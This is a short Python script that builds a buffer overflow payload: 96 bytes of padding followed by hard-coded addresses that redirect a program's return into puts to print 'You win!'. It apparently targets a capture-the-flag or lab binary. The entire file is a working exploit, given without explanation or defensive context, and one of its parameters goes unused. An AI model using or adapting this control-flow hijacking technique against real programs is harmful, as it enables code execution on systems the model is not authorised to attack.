def buffer(buffer_addr, puts_addr, string_addr):
    buffer = (" " * 96) + puts_addr + string_addr + "You win!\0"
    print(buffer)

buffer("\x0c\xd1\xff\xff", "\xc0\x84\x04\x08", "\x74\xd1\xff\xff")
